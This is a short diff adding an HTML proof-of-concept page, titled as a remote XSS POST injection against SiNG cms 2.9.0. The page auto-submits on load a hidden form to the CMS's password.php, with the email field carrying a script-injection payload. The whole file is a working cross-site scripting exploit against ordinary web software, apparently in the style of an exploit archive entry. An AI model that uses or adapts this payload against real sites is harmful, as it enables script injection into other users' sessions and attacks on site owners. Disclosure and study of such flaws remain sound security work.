@@ -1,0 +1,14 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;SiNG cms 2.9.0 (email) Remote XSS POST Injection Vulnerability&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form name=&quot;email&quot; method=&quot;post&quot; action=&quot;http://www,example.com/singcms/password.php&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;send&quot; value=&quot;Send password&quot; /&gt;
+&lt;/form&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+document.email.submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
